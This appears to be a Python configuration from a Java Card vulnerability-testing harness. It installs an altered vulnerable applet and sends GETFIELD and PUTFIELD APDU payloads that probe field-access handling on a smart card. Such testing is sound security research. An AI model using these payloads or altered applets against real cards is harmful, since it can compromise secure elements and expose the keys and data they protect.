class Stages:
    STAGES = [
        {
            "name": "install",
            "path": "build/{version}/com/se/vulns/javacard/vulns.new.cap",
            "comment": "The altered vulnerable applet",
            "optional": False,
        },
        {
            "name": "install",
            "path": "build/{version}/com/se/applets/javacard/applets.cap",
            "comment": "The base applet",
            "optional": False,
        },
        {
            "name": "send",
            "comment": "GETFIELD_A APDU",
            "payload": "0x80 0x10 0x01 0x02	0x01	0x00		0x7F",
        },
        {
            "name": "send",
            "comment": "PUTFIELD_A APDU",
            "payload": "0x80 0x11 0x01 0x02	0x02	0x7f 0xff	0x7F",
        },
        {
            "name": "send",
            "comment": "GETFIELD_B APDU",
            "payload": "0x80 0x12 0x01 0x02	0x01	0x00		0x7F",
        },
        {
            "name": "send",
            "comment": "PUTFIELD_B APDU",
            "payload": "0x80 0x13 0x01 0x02	0x02	0x7f 0xff	0x7F",
        },
        {
            "name": "send",
            "comment": "GETFIELD_S APDU",
            "payload": "0x80 0x14 0x01 0x02	0x01	0x00		0x7F",
        },
        {
            "name": "send",
            "comment": "PUTFIELD_S APDU",
            "payload": "0x80 0x15 0x01 0x02	0x02	0x7f 0xff	0x7F",
        },
    ]
